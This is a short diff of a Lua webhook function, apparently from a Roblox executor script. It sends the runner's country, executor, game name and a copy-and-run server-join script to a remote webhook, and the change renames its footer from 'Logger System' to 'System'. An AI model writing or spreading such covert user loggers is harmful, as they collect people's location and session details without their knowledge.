@@ -51,9 +51,9 @@ local function SendWebhook()
                         {["name"] = "🌍 Location", ["value"] = Country, ["inline"] = true},
                         {["name"] = "💻 Executor", ["value"] = Executor, ["inline"] = true},
                         {["name"] = "🎮 Game", ["value"] = GameName, ["inline"] = false},
-                        {["name"] = "🔗 Join Server Script (Copy & Run)", ["value"] = "lua\n" .. JoinCode .. "\n", ["inline"] = false}
+                        {["name"] = "🔗 Join Server Script (Copy & Run)", ["value"] = "```lua\n" .. JoinCode .. "\n```", ["inline"] = false}
                     },
-                    ["footer"] = {["text"] = "Hizuma_67 Logger System"},
+                    ["footer"] = {["text"] = "Hizuma_67 System"},
                     ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
                 }}
             }
